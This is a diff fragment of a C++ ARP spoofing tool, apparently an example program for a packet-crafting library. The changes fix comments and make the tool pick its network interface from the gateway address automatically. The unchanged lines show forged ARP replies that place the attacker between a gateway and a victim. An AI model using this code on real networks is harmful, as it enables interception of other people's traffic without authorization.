@@ -47,20 +47,21 @@ int do_arp_spoofing(uint32_t iface, const string &iface_name, uint32_t gw, uint3
         cout << "Could not resolve victim's ip address.\n";
         return 6;
     }
+    // Print out the hw addresses we're using.
     cout << " Using gateway hw address: " << Utils::hwaddr_to_string(gw_hw) << "\n";
     cout << " Using victim hw address:  " << Utils::hwaddr_to_string(victim_hw) << "\n";
     cout << " Using own hw address:     " << Utils::hwaddr_to_string(own_hw) << "\n";
     
     /* We tell the gateway that the victim is at out hw address,
      * and tell the victim that the gateway is at out hw address */
-    ARP *gw_arp = new ARP(gw, victim, gw_hw, own_hw), 
+    ARP *gw_arp     = new ARP(gw, victim, gw_hw, own_hw), 
         *victim_arp = new ARP(victim, gw, victim_hw, own_hw);
     // We are "replying" ARP requests
     gw_arp->opcode(ARP::REPLY);
     victim_arp->opcode(ARP::REPLY);
     
     /* The packet we'll send to the gateway and victim. 
-     * We include ut hw address as the source address
+     * We include our hw address as the source address
      * in ethernet layer, to avoid possible packet dropping
      * performed by any routers. */
     EthernetII to_gw(iface, gw_hw, own_hw, gw_arp);
@@ -74,12 +75,10 @@ int do_arp_spoofing(uint32_t iface, const string &iface_name, uint32_t gw, uint3
 }
 
 int main(int argc, char *argv[]) {
-    if(argc < 3 && cout << "Usage: " << *argv << " <Gateway> <Victim> [Interface=eth0]\n")
+    if(argc != 3 && cout << "Usage: " << *argv << " <Gateway> <Victim>\n")
         return 1;
     uint32_t gw, victim, own_ip;
     uint8_t own_hw[6];
-    // By default, eth0 is used.
-    string iface("eth0");
     try {
         // Convert dotted-notation ip addresses to integer. 
         gw     = Utils::ip_to_int(argv[1]);
@@ -89,9 +88,10 @@ int main(int argc, char *argv[]) {
         cout << "Invalid ip found...\n";
         return 2;
     }
-    if(argc == 4)
-        iface = argv[3];
-        
+    
+    // Get the interface which will be the gateway for our requests.
+    string iface = Utils::interface_from_ip(gw);
+    cout << iface << "\n";
     uint32_t iface_index;
     // Lookup the interface id. This will be required while forging packets.
     if(!Utils::interface_id(iface, iface_index) && cout << "Interface " << iface << " does not exist!\n")
